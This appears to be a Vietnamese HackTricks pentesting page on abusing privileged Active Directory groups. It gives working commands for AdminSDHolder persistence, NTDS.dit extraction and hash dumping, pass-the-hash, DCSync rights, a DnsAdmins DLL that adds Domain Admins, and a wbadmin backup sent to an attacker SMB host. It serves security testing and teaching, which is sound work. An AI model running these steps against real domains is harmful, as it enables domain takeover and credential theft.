# Các nhóm có đặc quyền

{{#include ../../banners/hacktricks-training.md}}

## Các nhóm đã biết có đặc quyền quản trị

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Nhóm này có quyền tạo tài khoản và nhóm không phải quản trị viên trong domain. Ngoài ra, nhóm này cho phép đăng nhập cục bộ vào Domain Controller (DC).

Để xác định các thành viên của nhóm này, hãy chạy lệnh sau:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Có thể thêm người dùng mới, cũng như đăng nhập cục bộ vào DC.<sup>[[1]](#references)</sup>

Một đường dẫn có điều kiện từ quản lý tài khoản đến quyền truy cập quản trị viên cục bộ là **nhóm thông thường được ủy quyền đọc mật khẩu LAPS của một máy tính**. Hãy kiểm tra các quyền ghi thành viên có hiệu lực trên chính nhóm đó, xem nhóm có được bảo vệ hay không, và liệu tài khoản mới hoặc tài khoản bạn kiểm soát có thể thực sự tham gia nhóm hay không. Làm mới token của tài khoản trước khi kiểm tra quyền đọc LAPS trên máy tính đích. Với Windows LAPS được mã hóa, quyền đọc trong thư mục và quyền giải mã mật khẩu là hai yêu cầu riêng biệt; chỉ riêng tư cách thành viên nhóm hoặc tư cách thành viên Account Operators không đáp ứng yêu cầu nào trong số đó. Xem [phạm vi của Account Operators theo Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) và [ủy quyền Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Nhóm AdminSDHolder

Access Control List (ACL) của nhóm **AdminSDHolder** rất quan trọng vì danh sách này thiết lập quyền cho tất cả "nhóm được bảo vệ" trong Active Directory, bao gồm cả các nhóm có đặc quyền cao. Cơ chế này đảm bảo tính bảo mật của các nhóm đó bằng cách ngăn chặn những thay đổi trái phép.

Kẻ tấn công có thể khai thác điểm này bằng cách chỉnh sửa ACL của nhóm **AdminSDHolder**, cấp toàn quyền cho một người dùng thông thường. Điều này sẽ trao cho người dùng đó toàn quyền kiểm soát tất cả các nhóm được bảo vệ. Nếu quyền của người dùng này bị thay đổi hoặc xóa, chúng sẽ tự động được khôi phục trong vòng một giờ theo thiết kế của hệ thống.<sup>[[14]](#references)</sup>

Tài liệu Windows Server gần đây vẫn xem một số nhóm operator tích hợp sẵn là đối tượng **được bảo vệ** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, v.v.). Theo mặc định, tiến trình **SDProp** chạy trên **PDC Emulator** mỗi 60 phút, đặt `adminCount=1` và tắt tính năng kế thừa trên các đối tượng được bảo vệ. Điều này hữu ích cho cả việc duy trì quyền truy cập lẫn truy tìm những người dùng có đặc quyền đã bị xóa khỏi nhóm được bảo vệ nhưng vẫn giữ ACL không kế thừa.<sup>[[12]](#references)</sup>

Các lệnh để xem lại thành viên và chỉnh sửa quyền bao gồm:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Có một script giúp đẩy nhanh quy trình khôi phục: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Để biết thêm chi tiết, truy cập [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Khả năng xem các đối tượng đã xóa được kiểm soát bởi quyền thư mục thực tế; chỉ riêng tên nhóm không chứng minh rằng danh tính hiện tại có thể liệt kê hoặc khôi phục một đối tượng. AD Recycle Bin phải được bật trước khi đối tượng bị xóa thì mới có thể khôi phục đầy đủ; việc khôi phục cũng yêu cầu quyền Reanimate-Tombstones trên gốc naming context, quyền đổi tên và quyền CREATE_CHILD trên container đích. [Hướng dẫn về Recycle Bin của Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) và [các quy tắc ủy quyền xóa khôi phục](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) phân biệt các điều kiện này. Danh tính được ủy quyền có quyền đọc các đối tượng đã xóa có thể kiểm tra những bản ghi có khả năng tiết lộ thông tin nhạy cảm:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Điều này hữu ích để **khôi phục các đường dẫn đặc quyền trước đây**. Các đối tượng đã xóa vẫn có thể để lộ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPN cũ hoặc DN của một nhóm đặc quyền đã xóa mà sau đó một operator khác có thể khôi phục.

Các thuộc tính do ứng dụng xác định cũng có thể vẫn lưu giữ thông tin xác thực cũ khi đối tượng còn ở trạng thái đã xóa. Hãy xem đây là một đầu mối cần kiểm tra riêng: danh tính hiện tại phải được phép liệt kê đối tượng đã xóa **và** đọc thuộc tính đó, giá trị phải là thông tin xác thực có thể sử dụng được, đồng thời một principal vẫn đang hoạt động phải chấp nhận thông tin đó. Chỉ thành viên nhóm hoặc tên tài khoản đã xóa không chứng minh được bất kỳ bước nào trong số này; tránh in các giá trị thông tin xác thực trong quá trình liệt kê thông thường. [Tài liệu về Recycle Bin của Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) mô tả việc bảo toàn thuộc tính sau khi xóa.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Khôi phục tài khoản đã xóa thông qua ACL được ủy quyền

Kết quả `WRITE` từ công cụ ACL đối với tài khoản đã xóa là một manh mối, không phải bằng chứng rằng mọi quyền undelete đều có hiệu lực.<sup>[[18]](#references)</sup> Kiểm tra trực tiếp ACL của đối tượng đã xóa và `lastKnownParent`; các đường dẫn BloodHound có thể bỏ sót ACL của đối tượng đã xóa.<sup>[[19]](#references)</sup> Tài khoản được khôi phục có thể vẫn giữ password hash, nhưng việc khôi phục không tiết lộ mật khẩu hoặc cấp quyền đặt lại mật khẩu. Để xác thực, vẫn cần thông tin xác thực hợp lệ.<sup>[[19]](#references)</sup>

Để liệt kê các tài khoản đã xóa bị ẩn và xác nhận quyền reanimation từ Linux, hãy dùng `bloodyAD` cùng các LDAP control cho đối tượng đã được recycle và liên kết đã bị vô hiệu hóa. Sau đó khôi phục tài khoản đã chọn bằng `sAMAccountName` của tài khoản đó. Thay domain, host và danh tính trong ví dụ bằng thông tin của môi trường đã đánh giá; xác minh DN mục tiêu và `lastKnownParent` trước khi ghi.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Truy cập Domain Controller

Quyền truy cập tệp trên DC bị hạn chế, trừ khi người dùng thuộc nhóm `Server Operators`; khi đó, mức độ truy cập sẽ thay đổi.

### Privilege Escalation

Có thể dùng `PsService` hoặc `sc` từ Sysinternals để kiểm tra và sửa đổi quyền dịch vụ. Chẳng hạn, nhóm `Server Operators` có toàn quyền kiểm soát một số dịch vụ, cho phép thực thi các lệnh tùy ý và thực hiện privilege escalation:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Lệnh này cho thấy `Server Operators` có toàn quyền truy cập, cho phép thao túng các dịch vụ để đạt được đặc quyền cao hơn.

## Backup Operators

Tùy thuộc vào chính sách cục bộ và phiên đăng nhập, thành viên của `Backup Operators` có thể được cấp `SeBackupPrivilege` và `SeRestorePrivilege` trên máy chủ. Kiểm tra **token hiệu lực của tiến trình đang chạy các lệnh** bằng `whoami /groups` và `whoami /priv`: chỉ là thành viên không chứng minh rằng `SeBackupPrivilege` hiện diện và được bật. Nếu đặc quyền hiện diện nhưng bị tắt, có thể bật đặc quyền đó trong token; nếu đặc quyền không hiện diện hoặc đã bị loại bỏ, các thao tác sao lưu này không thể sử dụng đặc quyền đó. `SeBackupPrivilege` hỗ trợ **đọc** dữ liệu được bảo vệ thông qua các API hỗ trợ sao lưu (ví dụ: `FILE_FLAG_BACKUP_SEMANTICS` hoặc `robocopy /B`); `SeRestorePrivilege` là đặc quyền riêng dùng cho thao tác khôi phục/ghi. Các thao tác liệt kê thư mục và sao chép thông thường không nhất thiết sử dụng ngữ nghĩa sao lưu.<sup>[[1]](#references)</sup>

Để liệt kê các thành viên nhóm, hãy chạy:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Tấn công cục bộ

Trên máy chủ có token hiệu lực sở hữu `SeBackupPrivilege`, có thể dùng cách sao chép nhận biết quyền backup sau đây để đọc một tệp được bảo vệ:

1. Import các thư viện cần thiết:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Nếu privilege hiện diện nhưng bị vô hiệu hóa, hãy bật nó và xác minh trạng thái trong process này:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Sao chép một tệp từ thư mục bị hạn chế, chẳng hạn:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Tấn công AD

`NTDS.dit` là cơ sở dữ liệu Active Directory trên **domain controller (DC)**. Cách này yêu cầu có token phù hợp trên DC và quyền truy cập vào volume chứa cơ sở dữ liệu; tư cách thành viên Backup Operators ở nơi khác không cấp quyền truy cập vào một DC cụ thể. Cơ sở dữ liệu đang hoạt động thường bị khóa, vì vậy hãy dùng shadow copy có thể truy cập hoặc một phương tiện sao lưu khác trước khi sao chép. Việc tạo hoặc hiển thị shadow copy cũng phụ thuộc vào cấu hình VSS của máy chủ và quyền của người gọi. Ví dụ bên dưới giả định DC lưu `NTDS.dit` trên `C:` tại `\Windows\NTDS`; hãy điều chỉnh volume và đường dẫn nếu không đúng.

#### Dùng diskshadow.exe

1. Nếu được phép, hãy tạo và hiển thị shadow copy của ổ `C:` trên DC dưới dạng `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Sao chép `NTDS.dit` từ shadow copy:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Hoặc sử dụng `robocopy` để sao chép tệp:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Lưu hive `SYSTEM` của DC để trích xuất ngoại tuyến. `SAM` là cơ sở dữ liệu tài khoản cục bộ trên các hệ thống thành viên; hive `SAM` của DC không thể thay thế `NTDS.dit` hoặc cung cấp hash của tài khoản Administrator trong domain:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Chuyển `ntds.dit` và `SYSTEM.SAV` sang máy chủ phân tích rồi trích xuất các hash tài khoản domain. Một hive `SAM` đã lưu từ hệ thống thành viên, cùng với hive `SYSTEM` tương ứng, sẽ cung cấp các hash tài khoản cục bộ:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Nếu hash của **domain** Administrator được khôi phục từ `NTDS.dit`, có thể dùng nó để kiểm tra xác thực domain. Hash của Administrator cục bộ từ `SAM.SAV` là một thông tin xác thực khác và không thể xác thực với tư cách Administrator của domain.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Sử dụng wbadmin.exe

1. Thiết lập hệ thống tệp NTFS cho SMB server trên máy attacker và cache thông tin xác thực SMB trên máy mục tiêu.
2. Sử dụng `wbadmin.exe` để sao lưu hệ thống và trích xuất `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Để xem phần minh họa thực tế, hãy xem [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Các thành viên của nhóm **DnsAdmins** có thể khai thác đặc quyền của mình để tải một DLL bất kỳ với quyền SYSTEM trên máy chủ DNS, thường được lưu trữ trên Domain Controller. Khả năng này mở ra nhiều tiềm năng khai thác đáng kể.

Để liệt kê các thành viên của nhóm DnsAdmins, hãy dùng:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Thực thi DLL tùy ý (CVE‑2021‑40469)

> [!NOTE]
> Lỗ hổng này cho phép thực thi mã tùy ý với đặc quyền SYSTEM trong dịch vụ DNS (thường chạy bên trong các DC). Vấn đề này đã được khắc phục vào năm 2021.

Các thành viên có thể khiến máy chủ DNS tải một DLL tùy ý (từ máy cục bộ hoặc từ một share từ xa) bằng các lệnh như:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Cần khởi động lại dịch vụ DNS (có thể cần thêm quyền) để DLL được tải:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Để biết thêm chi tiết về vector tấn công này, hãy tham khảo ired.team.

#### Mimilib.dll

Cũng có thể sử dụng mimilib.dll để thực thi lệnh bằng cách chỉnh sửa nó để thực thi các lệnh cụ thể hoặc reverse shell. [Xem bài viết này](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) để biết thêm thông tin.<sup>[[15]](#references)</sup>

### WPAD Record cho MitM

DnsAdmins có thể thao túng bản ghi DNS để thực hiện các cuộc tấn công Man-in-the-Middle (MitM) bằng cách tạo một WPAD record sau khi tắt global query block list. Có thể sử dụng các công cụ như Responder hoặc Inveigh để giả mạo và thu thập lưu lượng mạng.

### Event Log Readers
Các thành viên có thể truy cập event log và có khả năng tìm thấy thông tin nhạy cảm như mật khẩu dạng plaintext hoặc chi tiết về việc thực thi lệnh:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Nhóm này có thể chỉnh sửa DACL trên đối tượng miền, từ đó có khả năng cấp quyền DCSync. Các kỹ thuật leo thang đặc quyền khai thác nhóm này được trình bày chi tiết trong repo GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Nếu có thể hoạt động với tư cách thành viên của nhóm này, cách lạm dụng kinh điển là cấp cho một principal do kẻ tấn công kiểm soát các quyền replication cần thiết cho [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Trong lịch sử, **PrivExchange** đã kết hợp quyền truy cập mailbox, cưỡng ép Exchange xác thực và LDAP relay để đạt được cùng primitive này. Ngay cả khi đường relay đó đã được giảm thiểu, việc là thành viên trực tiếp của `Exchange Windows Permissions` hoặc kiểm soát một máy chủ Exchange vẫn là con đường có giá trị cao để giành quyền replication trong domain.

## Hyper-V Administrators

Hyper-V Administrators có toàn quyền truy cập Hyper-V, có thể bị khai thác để giành quyền kiểm soát các Domain Controller ảo hóa. Việc này bao gồm clone DC đang hoạt động và trích xuất NTLM hash từ file NTDS.dit.

### Ví dụ khai thác

Cách lạm dụng thực tế thường là **truy cập offline vào ổ đĩa/checkpoint của DC**, thay vì dùng các thủ thuật LPE cấp host đã lỗi thời. Khi có quyền truy cập vào host Hyper-V, operator có thể tạo checkpoint hoặc export một Domain Controller ảo hóa, mount VHDX và trích xuất `NTDS.dit`, `SYSTEM` cùng các secret khác mà không cần đụng đến LSASS bên trong guest:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Từ đó, tái sử dụng quy trình của `Backup Operators` để sao chép `Windows\NTDS\ntds.dit` và các registry hive ở chế độ offline. Quy trình liên quan đến file backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Nhóm này cho phép thành viên tạo Group Policy trong domain. Tuy nhiên, thành viên không thể áp dụng group policy cho người dùng hoặc nhóm, cũng không thể chỉnh sửa GPO hiện có.

Điểm quan trọng là **người tạo trở thành chủ sở hữu của GPO mới** và thường có đủ quyền để chỉnh sửa GPO đó sau này. Điều đó khiến nhóm này đáng chú ý khi bạn có thể:

- tạo một GPO độc hại và thuyết phục admin liên kết nó với OU/domain mục tiêu
- chỉnh sửa một GPO do bạn tạo đã được liên kết ở nơi hữu ích
- lạm dụng một quyền được ủy quyền khác cho phép bạn liên kết GPO, trong khi nhóm này cung cấp quyền chỉnh sửa

Trên thực tế, việc lạm dụng thường bao gồm thêm **Immediate Task**, **startup script**, **local admin membership** hoặc thay đổi **user rights assignment** thông qua các file policy được lưu trữ trên SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Nếu chỉnh sửa GPO thủ công thông qua `SYSVOL`, hãy nhớ rằng chỉ thay đổi nội dung là chưa đủ: cần cập nhật cả `versionNumber`, `GPT.ini` và đôi khi cả `gPCMachineExtensionNames`, nếu không client sẽ bỏ qua lần làm mới policy.<sup>[[9]](#references)</sup>

## Organization Management

Trong các môi trường triển khai **Microsoft Exchange**, một nhóm đặc biệt có tên **Organization Management** sở hữu nhiều quyền hạn đáng kể. Nhóm này có đặc quyền **truy cập mailbox của tất cả người dùng trong domain** và nắm **toàn quyền kiểm soát Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Quyền kiểm soát này bao gồm cả nhóm **`Exchange Windows Permissions`**, có thể bị khai thác để leo thang đặc quyền.

### Khai thác đặc quyền và lệnh

#### Print Operators

Thành viên của nhóm **Print Operators** được cấp một số đặc quyền, bao gồm **`SeLoadDriverPrivilege`**, cho phép họ **đăng nhập cục bộ vào Domain Controller**, tắt máy và quản lý máy in. Để khai thác các đặc quyền này, đặc biệt nếu **`SeLoadDriverPrivilege`** không hiển thị trong ngữ cảnh chưa được nâng quyền, cần vượt qua User Account Control (UAC).<sup>[[1]](#references)</sup>

Để liệt kê các thành viên của nhóm này, hãy dùng lệnh PowerShell sau:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Trên Domain Controllers, nhóm này nguy hiểm vì Domain Controller Policy mặc định cấp **`SeLoadDriverPrivilege`** cho `Print Operators`. Nếu lấy được token đã nâng quyền của thành viên nhóm này, bạn có thể bật đặc quyền và nạp một driver đã ký nhưng có lỗ hổng để leo thang lên kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Để biết chi tiết về xử lý token, hãy xem [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Các thành viên của nhóm này được cấp quyền truy cập vào PC thông qua Remote Desktop Protocol (RDP). Có thể dùng các lệnh PowerShell để liệt kê các thành viên này:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Có thể tìm thêm thông tin chi tiết về cách khai thác RDP trong các tài liệu pentesting chuyên biệt.

#### Remote Management Users

Các thành viên có thể truy cập PC thông qua **Windows Remote Management (WinRM)**. Có thể liệt kê các thành viên này bằng cách:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Đối với các kỹ thuật khai thác liên quan đến **WinRM**, cần tham khảo tài liệu cụ thể.

#### Server Operators

Nhóm này có quyền thực hiện nhiều cấu hình khác nhau trên Domain Controller, bao gồm quyền sao lưu và khôi phục, thay đổi thời gian hệ thống và tắt hệ thống.<sup>[[1]](#references)</sup> Để liệt kê các thành viên, hãy dùng lệnh sau:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Trên Domain Controller, `Server Operators` thường được kế thừa đủ quyền để **cấu hình lại hoặc khởi động/dừng service**, đồng thời nhận `SeBackupPrivilege`/`SeRestorePrivilege` thông qua policy mặc định của DC. Trên thực tế, điều này biến họ thành cầu nối giữa **lạm dụng quyền kiểm soát service** và **trích xuất NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Không liệt kê được các service không có nghĩa là không thể truy cập một **service đã biết**. Service Control Manager kiểm tra riêng quyền `SC_MANAGER_ENUMERATE_SERVICE` để liệt kê và quyền `SC_MANAGER_CONNECT`; mở một service theo tên sẽ kiểm tra các quyền riêng của service đó, bao gồm `SERVICE_CHANGE_CONFIG` và `SERVICE_START`. Hãy xem xét token hiệu lực và ACL của service đó ngay cả khi lệnh `sc.exe query` thông thường thất bại. Chỉ có quyền cấu hình thì mới chỉ là một khả năng: danh tính service, quyền start/stop và một trigger có thể sử dụng vẫn quyết định liệu có thể chuyển sang quyền cao hơn hay không. Xem [tài liệu tham khảo của Microsoft về quyền truy cập service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Nếu ACL của service cấp cho nhóm này quyền thay đổi/start, hãy trỏ service đến một lệnh tùy ý, khởi động service dưới danh nghĩa `LocalSystem`, rồi khôi phục `binPath` ban đầu. Nếu quyền kiểm soát service bị hạn chế, hãy chuyển sang các kỹ thuật `Backup Operators` ở trên để sao chép `NTDS.dit`.

## References

- [1] [ired.team – Tài khoản đặc quyền và quyền Token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Lạm dụng SeLoadDriverPrivilege để leo thang đặc quyền](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Lạm dụng quyền GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Lạm dụng GPO, Phần 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Hướng dẫn của Red Teamer về GPO và OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Hàm ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP ẩn danh → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Phụ lục C: Tài khoản và nhóm được bảo vệ trong Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Cách lạm dụng và cài backdoor vào AdminSDHolder để duy trì quyền Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Lạm dụng đặc quyền DnsAdmins để leo thang trong Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Thông tin về lạm dụng cạnh GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Hàm NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Quy tắc ủy quyền khôi phục đối tượng đã xóa](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
